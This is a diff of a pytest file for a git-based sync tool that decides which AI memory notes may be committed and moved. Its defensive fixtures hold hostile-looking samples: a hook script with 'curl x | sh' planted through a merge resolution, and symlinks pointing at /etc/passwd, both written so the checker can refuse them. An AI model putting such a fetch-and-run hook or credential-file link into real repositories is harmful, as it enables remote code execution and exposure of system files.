@@ -14,11 +14,12 @@ from pathlib import Path
 
 import pytest
 
+from stayfixed.gitenv import FLOOR_VARIABLE, QUERY_TIMEOUT_SECONDS
 from stayfixed.sync import git as G
 from stayfixed.sync import rules as R
+from stayfixed.sync import trigger
 from tests import gitfixture as fx
 from tests.sync.conftest import (
-    SLOW,
     World,
     commit_all,
     crafted_commit,
@@ -43,7 +44,8 @@ _PATHS = {
     "projects/x/memory/a.md": True,
     "projects/x/memory/deep/er/a.md": True,
     "projects/.dot/memory/a.md": True,
-    "projects/x/memory/MEMORY.md": True,
+    "projects/x/memory/MEMORY.md": False,
+    "projects/x/memory/d/MEMORY.md": True,
     "groups/g/checkout/memory/a.md": False,
     "groups/g/y/memory/a.md": False,
     "groups/memory/a.md": False,
@@ -62,6 +64,9 @@ _PATHS = {
     ".pre-commit-config.yaml": False,
 }
 
+# The new side of a change the test only judges by its modes and path.
+BLOB = "0" * 40
+
 
 # -- the layout ------------------------------------------------------------------------------------
 
@@ -73,7 +78,8 @@ _PATHS = {
         ("common/memory/d/b.md", ("common", None, ("d", "b.md"))),
         ("groups/g/memory/a.md", ("group", "g", ("a.md",))),
         ("groups/g/memory/d/MEMORY.md", ("group", "g", ("d", "MEMORY.md"))),
-        ("projects/x/memory/MEMORY.md", ("project", "x", ("MEMORY.md",))),
+        ("projects/x/memory/d/MEMORY.md", ("project", "x", ("d", "MEMORY.md"))),
+        ("projects/x/memory/MEMORY.md", None),
         ("projects/x/memory/deep/er/a.md", ("project", "x", ("deep", "er", "a.md"))),
         ("groups/g/checkout/memory/a.md", None),
         ("projects/x/y/memory/a.md", None),
@@ -90,27 +96,27 @@ def test_the_layout_takes_a_path_apart(
     found = R.memory_path(path)
 
     assert (found if found is None else (found.scope, found.name, found.below)) == parsed
-    assert R.is_memory_path(path) is (parsed is not None)
 
 
-def test_a_scope_knows_its_root_and_its_index() -> None:
-    assert R.memory_path("common/memory/a.md").root == "common/memory"  # type: ignore[union-attr]
-    assert R.memory_path("groups/g/memory/a.md").root == "groups/g/memory"  # type: ignore[union-attr]
-    assert R.memory_path("projects/p/memory/a.md").root == "projects/p/memory"  # type: ignore[union-attr]
-    assert R.index_of("p") == "projects/p/memory/MEMORY.md"
-    assert R.INDEX_NAME == "MEMORY.md"
-
-
-def test_only_a_projects_own_memory_md_is_its_index() -> None:
-    index = R.memory_path("projects/p/memory/MEMORY.md")
-    assert index is not None and index.is_index and index.is_note
-    for path in (
-        "projects/p/memory/sub/MEMORY.md",
-        "groups/g/memory/MEMORY.md",
-        "common/memory/MEMORY.md",
-    ):
-        parsed = R.memory_path(path)
-        assert parsed is not None and not parsed.is_index, path
+def test_a_projects_index_is_not_memory(tmp_path: Path) -> None:
+    # Each machine renders its own index, so the sync never stages, writes or moves one: a
+    # project's `MEMORY.md` is outside memory, by the layout and by git's own match, and a change
+    # to one may not move. A `MEMORY.md` anywhere else is a note like any. Mutation (oracle):
+    # `mutations/`'s "an index is memory again" and `mutations/`'s "an index name parses as a
+    # note".
+    index = "projects/p/memory/MEMORY.md"
+    assert R.memory_path(index) is None
+    for path in ("projects/p/memory/sub/MEMORY.md", "groups/g/memory/MEMORY.md"):
+        assert R.memory_path(path) is not None, path
+    repo = init(tmp_path / "r")
+    for path in (index, "projects/p/memory/a.md", "common/memory/MEMORY.md"):
+        write(repo, path)
+    commit_all(repo)
+    listed = git(repo, "ls-files", "-z", "--", *R.MEMORY_PATHSPEC).split("\0")
+    assert sorted(listed) == ["", "common/memory/MEMORY.md", "projects/p/memory/a.md"]
+    for status in ("A", "M"):
+        assert R.entry_offends(R.RawEntry("100644", status, index, BLOB)) is True, status
+    assert R.entry_offends(R.RawEntry("000000", "D", index, BLOB)) is True
 
 
 def test_the_pathspecs_are_derived_from_the_layout_in_three_scopes() -> None:
@@ -118,16 +124,11 @@ def test_the_pathspecs_are_derived_from_the_layout_in_three_scopes() -> None:
         ":(top,glob)common/memory/**",
         ":(top,glob)groups/*/memory/**",
         ":(top,glob)projects/*/memory/**",
-    )
-    # The directory each pathspec's literal part lies in, for a `git add` that a link there
-    # would refuse whole.
-    assert (
-        tuple(zip(R.MEMORY_PATHSPEC, ("common/memory", "groups", "projects"), strict=True))
-        == R.MEMORY_SPECS
+        ":(top,exclude,glob)projects/*/memory/MEMORY.md",
     )
 
 
-def test_is_memory_path_agrees_with_git(tmp_path: Path) -> None:
+def test_the_layout_agrees_with_git(tmp_path: Path) -> None:
     """The Python rule and the pathspec git applies must never disagree, path for path."""
     repo = init(tmp_path / "r")
     for path in _PATHS:
@@ -136,16 +137,17 @@ def test_is_memory_path_agrees_with_git(tmp_path: Path) -> None:
 
     every = set(git(repo, "ls-files", "-z").split("\0")) - {""}
     matched = set(git(repo, "ls-files", "-z", "--", *R.MEMORY_PATHSPEC).split("\0")) - {""}
-    not_memory = [spec.replace(":(top", ":(exclude,top") for spec in R.MEMORY_PATHSPEC]
-    excluded = set(git(repo, "ls-files", "-z", "--", *not_memory).split("\0")) - {""}
 
     assert every == set(_PATHS)
-    assert matched == {path for path in every if R.is_memory_path(path)}
+    assert matched == {path for path in every if R.memory_path(path) is not None}
     assert matched == {path for path, memory in _PATHS.items() if memory}
-    assert excluded == every - matched
 
 
 # -- dirty notes ----------------------------------------------------------------------------------
+
+
+def dirty_memory(repo: Path, *, timeout: float = 30.0) -> list[str]:
+    return list(R.status(repo, timeout=timeout).paths)
 
 
 def test_dirty_memory_sees_an_untracked_changed_and_deeper_note_in_each_scope(world: World) -> None:
@@ -158,7 +160,7 @@ def test_dirty_memory_sees_an_untracked_changed_and_deeper_note_in_each_scope(wo
     write(a, "projects/p/checkout/memory/stray.md")
     write(a, "groups/g/checkout/memory/stray.md")
 
-    assert sorted(R.dirty_memory(a, timeout=SLOW)) == [
+    assert sorted(dirty_memory(a)) == [
         "common/memory/first.md",
         "common/memory/new.md",
         "groups/g/memory/new.md",
@@ -172,7 +174,7 @@ def test_dirty_memory_sees_a_deleted_and_a_staged_note(world: World) -> None:
     write(a, "groups/g/memory/staged.md")
     git(a, "add", "groups/g/memory/staged.md")
 
-    assert sorted(R.dirty_memory(a, timeout=SLOW)) == [
+    assert sorted(dirty_memory(a)) == [
         "common/memory/first.md",
         "groups/g/memory/staged.md",
     ]
@@ -183,22 +185,40 @@ def test_dirty_memory_hands_odd_names_back_as_written(world: World) -> None:
     write(world.a, odd)
     write(world.a, 'common/memory/"quoted".md')
 
-    assert sorted(R.dirty_memory(world.a, timeout=SLOW)) == sorted(
-        [odd, 'common/memory/"quoted".md']
-    )
+    assert sorted(dirty_memory(world.a)) == sorted([odd, 'common/memory/"quoted".md'])
 
 
 def test_dirty_memory_is_empty_when_only_other_paths_changed(world: World) -> None:
     write(world.a, "common/claude/hooks/x.py", "work in progress\n")
 
-    assert R.dirty_memory(world.a, timeout=SLOW) == []
+    assert dirty_memory(world.a) == []
+
+
+def test_one_status_feeds_the_trigger_and_the_commit(world: World) -> None:
+    # The trigger's question and the commit's are one `git status`, read once: changed, staged
+    # and untracked notes, an odd name, the commits ahead of `origin/main` and `HEAD`.
+    a = world.a
+    write(a, "common/memory/ahead.md")
+    tip = commit_all(a, "memory: ahead")
+    odd = "projects/x/memory/a b \nc.md"
+    write(a, odd)
+    write(a, "common/memory/first.md", "edited\n")
+    write(a, "groups/g/memory/staged.md")
+    git(a, "add", "groups/g/memory/staged.md")
+    write(a, "common/claude/hooks/x.py", "not memory\n")
+
+    status = R.status(a, timeout=QUERY_TIMEOUT_SECONDS)
+
+    paths = sorted([odd, "common/memory/first.md", "groups/g/memory/staged.md"])
+    assert (sorted(status.paths), status.ahead, status.head) == (paths, 1, tip)
+    assert trigger._tree(a) == status
 
 
 def test_dirty_memory_reports_a_link_without_judging_it(world: World) -> None:
     """A trigger, not a verdict: a link is dirty, and the commit step refuses it by its mode."""
     symlink(world.a, "common/memory/link.md", "/etc/passwd")
 
-    assert R.dirty_memory(world.a, timeout=SLOW) == ["common/memory/link.md"]
+    assert dirty_memory(world.a) == ["common/memory/link.md"]
 
 
 # -- commits and ranges ---------------------------------------------------------------------------
@@ -207,7 +227,7 @@ def test_dirty_memory_reports_a_link_without_judging_it(world: World) -> None:
 def _listed(repo: Path, rev_range: str) -> list[tuple[str, list[str]]]:
     return [
         (sha, sorted(entry.path for entry in entries))
-        for sha, entries in R.commit_entries(repo, rev_range, timeout=SLOW)
+        for sha, entries in R.commit_entries(repo, rev_range)
     ]
 
 
@@ -226,8 +246,9 @@ def test_commit_entries_lists_each_commit_newest_first_with_its_modes(world: Wor
         (second, sorted(["common/claude/hooks/x.py", odd, "groups/g/memory/two.md"])),
         (first, ["common/memory/one.md"]),
     ]
-    entries = dict(R.commit_entries(a, f"{base}..{first}", timeout=SLOW))[first]
-    assert entries == [R.RawEntry("000000", "100644", "A", "common/memory/one.md")]
+    entries = dict(R.commit_entries(a, f"{base}..{first}"))[first]
+    blob = git(a, "rev-parse", f"{first}:common/memory/one.md").strip()
+    assert entries == [R.RawEntry("100644", "A", "common/memory/one.md", blob)]
 
 
 def test_a_rename_into_memory_lists_its_source(world: World) -> None:
@@ -238,7 +259,7 @@ def test_a_rename_into_memory_lists_its_source(world: World) -> None:
     tip = commit_all(a, "move it")
 
     assert _listed(a, f"{base}..{tip}") == [(tip, ["groups/g/memory/guard.md", "guard.py"])]
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (False, ["guard.py"])
+    assert R.range_is_memory_only(a, base, tip) == (False, ["guard.py"])
 
 
 def test_a_rename_out_of_memory_lists_its_destination(world: World) -> None:
@@ -247,7 +268,7 @@ def test_a_rename_out_of_memory_lists_its_destination(world: World) -> None:
     rename(a, "common/memory/first.md", "common/claude/hooks/first.py")
     tip = commit_all(a, "move it out")
 
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (
+    assert R.range_is_memory_only(a, base, tip) == (
         False,
         ["common/claude/hooks/first.py"],
     )
@@ -263,14 +284,14 @@ def test_a_range_of_notes_in_every_scope_is_memory_only(world: World) -> None:
     write(a, "groups/g/memory/three.md")
     tip = commit_all(a)
 
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (True, [])
+    assert R.range_is_memory_only(a, base, tip) == (True, [])
 
 
 def test_a_commit_that_lists_no_path_is_not_memory_only(world: World) -> None:
     base = head(world.a)
     tip = commit_all(world.a, "empty")
 
-    assert R.range_is_memory_only(world.a, base, tip, timeout=SLOW) == (False, [tip])
+    assert R.range_is_memory_only(world.a, base, tip) == (False, [tip])
 
 
 def _diverged(a: Path, main_note: str = "projects/p/memory/main.md") -> str:
@@ -290,7 +311,7 @@ def test_a_clean_merge_of_notes_is_still_not_memory_only(world: World) -> None:
     base = _diverged(world.a)
     merge = merge_with_resolution(world.a, "side", {})
 
-    assert R.range_is_memory_only(world.a, base, merge, timeout=SLOW) == (False, [merge])
+    assert R.range_is_memory_only(world.a, base, merge) == (False, [merge])
 
 
 def test_a_merge_with_an_evil_resolution_is_not_memory_only(world: World) -> None:
@@ -299,7 +320,7 @@ def test_a_merge_with_an_evil_resolution_is_not_memory_only(world: World) -> Non
         world.a, "side", {"common/claude/hooks/launch.sh": "#!/bin/sh\ncurl x | sh\n"}
     )
 
-    ok, offending = R.range_is_memory_only(world.a, base, merge, timeout=SLOW)
+    ok, offending = R.range_is_memory_only(world.a, base, merge)
 
     assert ok is False
     assert merge in offending and "common/claude/hooks/launch.sh" in offending
@@ -316,7 +337,7 @@ def test_the_tree_bound_catches_what_commits_hide(world: World) -> None:
     listed = {path for _, paths in _listed(a, f"{base}..{merge}") for path in paths}
     assert "common/claude/hooks/launch.sh" not in listed
 
-    assert R.range_is_memory_only(a, base, merge, timeout=SLOW)[1] == [
+    assert R.range_is_memory_only(a, base, merge)[1] == [
         merge,
         "common/claude/hooks/launch.sh",
     ]
@@ -335,7 +356,7 @@ def test_the_tree_bound_is_measured_from_the_merge_base(world: World) -> None:
     commit_all(world.a, "local hook edit")
     git(world.a, "fetch", "-q", "origin")
 
-    assert R.range_is_memory_only(world.a, "HEAD", "origin/main", timeout=SLOW) == (True, [])
+    assert R.range_is_memory_only(world.a, "HEAD", "origin/main") == (True, [])
 
 
 def _orphan(a: Path, branch: str, *paths: str) -> str:
@@ -351,10 +372,10 @@ def test_a_range_with_no_common_history_is_measured_from_the_empty_tree(world: W
     base = head(world.a)
     tip = _orphan(world.a, "first", "groups/g/memory/only.md")
 
-    assert R.range_is_memory_only(world.a, base, tip, timeout=SLOW) == (True, [])
+    assert R.range_is_memory_only(world.a, base, tip) == (True, [])
 
     other = _orphan(world.a, "second", "groups/g/memory/only.md", "README.md")
-    assert R.range_is_memory_only(world.a, base, other, timeout=SLOW) == (False, ["README.md"])
+    assert R.range_is_memory_only(world.a, base, other) == (False, ["README.md"])
 
 
 def test_a_leading_newline_belongs_only_to_the_first_path_after_a_sha(world: World) -> None:
@@ -370,7 +391,7 @@ def test_a_leading_newline_belongs_only_to_the_first_path_after_a_sha(world: Wor
     tip = commit_all(a, "odd")
 
     assert _listed(a, f"{base}..{tip}") == [(tip, ["\x01x", "\ncommon/memory/z.md"])]
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (
+    assert R.range_is_memory_only(a, base, tip) == (
         False,
         ["\x01x", "\ncommon/memory/z.md"],
     )
@@ -383,7 +404,7 @@ def test_a_symlink_under_memory_is_not_memory_only(world: World) -> None:
     symlink(a, "groups/g/memory/pw.md", "/etc/passwd")
     tip = commit_all(a, "links")
 
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (
+    assert R.range_is_memory_only(a, base, tip) == (
         False,
         ["common/memory/evil.md", "groups/g/memory/pw.md"],
     )
@@ -404,8 +425,8 @@ def test_a_symlinked_directory_is_refused_even_after_it_is_replaced(world: World
     write(a, "common/memory/sub/launch.md", "a note that happens to have this name\n")
     tip = commit_all(a, "replace it")
 
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (False, ["common/memory/sub"])
-    assert R.range_is_memory_only(a, linked, tip, timeout=SLOW) == (False, ["common/memory/sub"])
+    assert R.range_is_memory_only(a, base, tip) == (False, ["common/memory/sub"])
+    assert R.range_is_memory_only(a, linked, tip) == (False, ["common/memory/sub"])
 
 
 def test_a_gitlink_under_memory_is_not_memory_only(world: World) -> None:
@@ -418,7 +439,7 @@ def test_a_gitlink_under_memory_is_not_memory_only(world: World) -> None:
     tip = commit_all(a, "embed a repository")
 
     assert git(a, "ls-files", "-s", "groups/g/memory/nested.md").startswith("160000 ")
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (
+    assert R.range_is_memory_only(a, base, tip) == (
         False,
         ["groups/g/memory/nested.md"],
     )
@@ -431,7 +452,7 @@ def test_an_executable_note_is_not_memory_only(world: World) -> None:
     write(a, "groups/g/memory/runnable.md", "#!/bin/sh\n").chmod(0o755)
     tip = commit_all(a, "a note with +x")
 
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (
+    assert R.range_is_memory_only(a, base, tip) == (
         False,
         ["groups/g/memory/runnable.md"],
     )
@@ -447,48 +468,20 @@ def test_the_tree_bound_checks_modes_too(world: World) -> None:
     git(a, "commit", "-q", "--no-edit", "-m", "merge")
     merge = head(a)
 
-    assert R.range_is_memory_only(a, base, merge, timeout=SLOW) == (
+    assert R.range_is_memory_only(a, base, merge) == (
         False,
         [merge, "common/memory/hidden.md"],
     )
 
 
-def test_the_owners_notes_with_odd_names_pass(world: World) -> None:
-    """The legitimate use the mode rule must not refuse: regular notes, however they are named."""
-    a = world.a
-    base = head(a)
-    write(a, 'common/memory/the "owner\'s" note.md')
-    write(a, "projects/p/memory/a b ü.md")
-    commit_all(a, "notes")
-    (a / "common/memory/first.md").unlink()
-    tip = commit_all(a, "delete one")
-
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (True, [])
-
-
-def _staged_in(repo: Path, index: Path, *specs: str) -> None:
-    """A temporary index of `HEAD` plus the working tree's `specs`, as the commit step builds it."""
-    G.git(repo, "read-tree", "HEAD", timeout=SLOW, index_file=index)
-    ran = G.git(repo, "add", "-A", "--", *specs, timeout=SLOW, index_file=index)
+def _judged(repo: Path, *paths: str, against: str = "HEAD") -> list[str]:
+    """What the commit step refuses of `paths`: each added intent-to-add, then judged by what git
+    would record from the working tree against `against`, path by path."""
+    literal = {"GIT_LITERAL_PATHSPECS": "1"}
+    ran = G.git(repo, "add", "-N", "--", *paths, env=literal)
     assert ran.code == 0, ran.err
-
-
-def test_offending_paths_on_a_temporary_index(world: World, tmp_path: Path) -> None:
-    """What the commit step runs on its temporary index before writing a tree."""
-    a = world.a
-    write(a, "common/memory/fine.md")
-    symlink(a, "groups/g/memory/link.md", "/etc/passwd")
-    nested = init(a / "projects/p/memory/nested.md")
-    write(nested, "f.md")
-    commit_all(nested, "inner")
-    index = tmp_path / "sync.index"
-    _staged_in(a, index, *R.MEMORY_PATHSPEC)
-
-    assert R.offending_paths(a, "--cached", "HEAD", index_file=index, timeout=SLOW) == [
-        "groups/g/memory/link.md",
-        "projects/p/memory/nested.md",
-    ]
-    assert git(a, "diff", "--cached", "--name-only") == ""  # the real index was never involved
+    entries = R.diff_entries(repo, against, paths=paths)
+    return [entry.path for entry in entries if R.entry_offends(entry)]
 
 
 # Each refused by exactly one of the three rules, so dropping that rule reddens its case.
@@ -536,16 +529,16 @@ def test_a_dot_component_or_a_non_md_name_under_memory_is_not_memory_only(
     write(a, path, _HOSTILE)
     tip = commit_all(a, "a path that is not a note")
 
-    assert R.is_memory_path(path)  # the pathspec matches it: being a note is what it fails
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (False, [path])
+    assert R.memory_path(path) is not None  # the pathspec matches it: being a note is what it fails
+    assert R.range_is_memory_only(a, base, tip) == (False, [path])
 
 
 @pytest.mark.parametrize("path", _NOT_A_NAME)
 def test_a_project_or_group_name_that_is_not_a_plain_name_never_moves(path: str) -> None:
     """The rule reaches the scope's own name: `..` and `.git` there pass the pathspec."""
-    assert R.is_memory_path(path)
-    assert R.entry_offends(R.RawEntry("000000", "100644", "A", path)) is True
-    assert R.entry_offends(R.RawEntry("100644", "000000", "D", path)) is True
+    assert R.memory_path(path) is not None
+    assert R.entry_offends(R.RawEntry("100644", "A", path, BLOB)) is True
+    assert R.entry_offends(R.RawEntry("000000", "D", path, BLOB)) is True
 
 
 @pytest.mark.parametrize(
@@ -562,7 +555,7 @@ def test_a_crafted_tree_with_such_a_name_is_not_memory_only(world: World, path: 
     base = head(world.a)
     tip = crafted_commit(world.a, base, path)
 
-    assert R.range_is_memory_only(world.a, base, tip, timeout=SLOW) == (False, [path])
+    assert R.range_is_memory_only(world.a, base, tip) == (False, [path])
 
 
 @pytest.mark.parametrize("path", _DOTTED + _NOT_MD + _BOTH)
@@ -574,7 +567,7 @@ def test_deleting_a_dot_or_non_md_path_is_not_memory_only(world: World, path: st
     (a / path).unlink()
     tip = commit_all(a, "remove it")
 
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (False, [path])
+    assert R.range_is_memory_only(a, base, tip) == (False, [path])
 
 
 def test_a_binary_note_is_not_memory_only_per_commit_and_by_the_bound(world: World) -> None:
@@ -587,12 +580,11 @@ def test_a_binary_note_is_not_memory_only_per_commit_and_by_the_bound(world: Wor
     write(a, "common/memory/other.md")
     tip = commit_all(a, "a plain note after it")
 
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (
+    assert R.range_is_memory_only(a, base, tip) == (
         False,
         ["groups/g/memory/blob.md"],
     )
-    assert R.offending_paths(a, base, tip, timeout=SLOW) == ["groups/g/memory/blob.md"]
-    assert R.range_is_memory_only(a, added, tip, timeout=SLOW) == (True, [])
+    assert R.range_is_memory_only(a, added, tip) == (True, [])
 
 
 def test_a_note_made_binary_by_attributes_is_not_memory_only(world: World) -> None:
@@ -603,26 +595,23 @@ def test_a_note_made_binary_by_attributes_is_not_memory_only(world: World) -> No
     write(a, "common/memory/hidden.md", "token: FAKE\n")
     tip = commit_all(a, "a note git will not show")
 
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (
+    assert R.range_is_memory_only(a, base, tip) == (
         False,
         ["common/memory/hidden.md"],
     )
 
 
-def test_a_gitattributes_in_the_working_tree_makes_its_siblings_binary(
-    world: World, tmp_path: Path
+def test_a_gitattributes_in_the_working_tree_is_refused_and_reaches_no_sibling(
+    world: World,
 ) -> None:
-    """The working tree's attributes are git's -- and gitleaks' -- whether committed or not: a
-    refused `.gitattributes` saying `-diff` also keeps the notes it covers from moving."""
+    """Attributes are read from `HEAD` (`JOB_SETTINGS`), so a `-diff` in the working tree is only
+    itself refused: the note it would cover moves, and the scan reads it."""
     a = world.a
     write(a, "groups/g/memory/.gitattributes", "* -diff\n")
     write(a, "groups/g/memory/covered.md", "token: FAKE\n")
-    index = tmp_path / "sync.index"
-    _staged_in(a, index, R.MEMORY_PATHSPEC[1])
 
-    assert R.offending_paths(a, "--cached", "HEAD", index_file=index, timeout=SLOW) == [
+    assert _judged(a, "groups/g/memory/.gitattributes", "groups/g/memory/covered.md") == [
         "groups/g/memory/.gitattributes",
-        "groups/g/memory/covered.md",
     ]
 
 
@@ -634,78 +623,52 @@ def test_deleting_a_binary_note_moves(world: World) -> None:
     (a / "common/memory/blob.md").unlink()
     tip = commit_all(a, "remove it")
 
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (True, [])
+    assert R.range_is_memory_only(a, base, tip) == (True, [])
 
 
-def test_an_ordinary_note_name_is_never_refused(world: World, tmp_path: Path) -> None:
+def test_an_ordinary_note_name_is_never_refused(world: World) -> None:
     a = world.a
     base = head(a)
     for path in _ACCEPTED:
         write(a, path)
     tip = commit_all(a, "notes")
 
-    assert R.range_is_memory_only(a, base, tip, timeout=SLOW) == (True, [])
-    index = tmp_path / "sync.index"
-    G.git(a, "read-tree", base, timeout=SLOW, index_file=index)
-    G.git(a, "add", "-A", "--", *R.MEMORY_PATHSPEC, timeout=SLOW, index_file=index)
-    assert R.offending_paths(a, "--cached", base, index_file=index, timeout=SLOW) == []
+    assert R.range_is_memory_only(a, base, tip) == (True, [])
+    assert _judged(a, *_ACCEPTED, against=base) == []
+    # Each matched as written: a quote, a leading dash, a Cyrillic name.
+    assert len(R.diff_entries(a, base, paths=_ACCEPTED)) == len(_ACCEPTED)
 
 
-def test_the_temporary_index_names_every_path_that_is_not_a_note(
-    world: World, tmp_path: Path
+_NOTE = "groups/g/memory/a.md"
+
+
+@pytest.mark.parametrize(
+    ("mode", "status", "path", "binary", "offends"),
+    [
+        ("100644", "A", "common/memory/a.md", False, False),
+        ("100644", "M", _NOTE, False, False),
+        ("100644", "A", _NOTE, True, True),  # git calls the content binary
+        ("000000", "D", _NOTE, True, False),  # a deletion has no content to call binary
+        ("100644", "A", "common/memory/.a.md", False, True),
+        ("000000", "D", "common/memory/a.txt", False, True),  # it was never a note either
+        ("100644", "A", "common/claude/x.md", False, True),
+        *(("000000", status, _NOTE, False, True) for status in "AMTUX"),  # "nothing here": a delete
+        *((mode, "M", _NOTE, False, True) for mode in ("100755", "120000", "160000", "040000")),
+    ],
+)
+def test_entry_offends_judges_name_mode_and_content(
+    mode: str, status: str, path: str, binary: bool, offends: bool
 ) -> None:
-    a = world.a
-    write(a, "common/memory/fine.md")
-    write(a, "projects/p/memory/g/.claude/skills/x/SKILL.md")
-    write(a, "groups/g/memory/h/.claude/skills/x/SKILL.md")
-    write(a, "common/memory/.gitattributes", "nothing-here.md -diff\n")
-    (a / "common/memory/blob.md").write_bytes(b"a\x00b")
-    index = tmp_path / "sync.index"
-    _staged_in(a, index, *R.MEMORY_PATHSPEC)
-
-    assert sorted(R.offending_paths(a, "--cached", "HEAD", index_file=index, timeout=SLOW)) == [
-        "common/memory/.gitattributes",
-        "common/memory/blob.md",
-        "groups/g/memory/h/.claude/skills/x/SKILL.md",
-        "projects/p/memory/g/.claude/skills/x/SKILL.md",
-    ]
-
-
-def test_entry_offends_judges_name_mode_and_content() -> None:
-    plain = R.RawEntry("000000", "100644", "A", "common/memory/a.md")
-    assert R.entry_offends(plain) is False
-    assert (
-        R.entry_offends(R.RawEntry("000000", "100644", "A", "groups/g/memory/a.md", True)) is True
-    )
-    assert R.entry_offends(R.RawEntry("100644", "000000", "D", "common/memory/a.md", True)) is False
-    assert R.entry_offends(R.RawEntry("000000", "100644", "A", "common/memory/.a.md")) is True
-    assert R.entry_offends(R.RawEntry("100644", "000000", "D", "common/memory/a.txt")) is True
-    assert R.entry_offends(R.RawEntry("000000", "100644", "A", "common/claude/x.md")) is True
-
-
-def test_mode_000000_is_allowed_only_for_a_deletion() -> None:
-    """`000000` is git's "nothing here": right for a deletion, wrong for anything else."""
-    note = "groups/g/memory/a.md"
-    assert R.entry_offends(R.RawEntry("100644", "000000", "D", note)) is False
-    for status in ("A", "M", "T", "U", "X"):
-        assert R.entry_offends(R.RawEntry("100644", "000000", status, note)) is True, status
-    assert R.entry_offends(R.RawEntry("000000", "100644", "A", note)) is False
-
-
-def test_only_a_regular_file_or_a_deletion_may_move() -> None:
-    note = "common/memory/a.md"
-    assert R.entry_offends(R.RawEntry("100644", "100644", "M", note)) is False
-    for mode in ("100755", "120000", "160000", "040000"):
-        assert R.entry_offends(R.RawEntry("100644", mode, "M", note)) is True, mode
+    assert R.entry_offends(R.RawEntry(mode, status, path, BLOB, binary)) is offends
 
 
 def test_an_empty_range_is_memory_only(world: World) -> None:
-    assert R.range_is_memory_only(world.a, "HEAD", "HEAD", timeout=SLOW) == (True, [])
+    assert R.range_is_memory_only(world.a, "HEAD", "HEAD") == (True, [])
 
 
 def test_a_revision_git_cannot_resolve_raises(world: World) -> None:
     with pytest.raises(G.GitError):
-        R.range_is_memory_only(world.a, "HEAD", "no-such-revision", timeout=SLOW)
+        R.range_is_memory_only(world.a, "HEAD", "no-such-revision")
 
 
 # -- time limits ----------------------------------------------------------------------------------
@@ -716,6 +679,7 @@ def test_the_range_check_keeps_to_its_whole_budget(
 ) -> None:
     """The 2-3 git calls of one range check share `timeout`; none gets it afresh. Each sleeps
     less than the whole, so a fresh budget per call would let the check finish."""
+    monkeypatch.delenv(FLOOR_VARIABLE)
     write(world.a, "common/memory/n.md", "n\n")
     tip = commit_all(world.a, "memory: n")
     base = head(world.a, "HEAD~1")
@@ -728,8 +692,9 @@ def test_the_range_check_keeps_to_its_whole_budget(
 def test_a_timed_out_git_call_is_a_git_timeout(
     world: World, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    monkeypatch.delenv(FLOOR_VARIABLE)
     slow_git(tmp_path, monkeypatch, {"status": 30})
 
     with pytest.raises(G.GitTimeout):
-        R.dirty_memory(world.a, timeout=0.5)
+        dirty_memory(world.a, timeout=0.5)
     assert issubclass(G.GitTimeout, G.GitError)
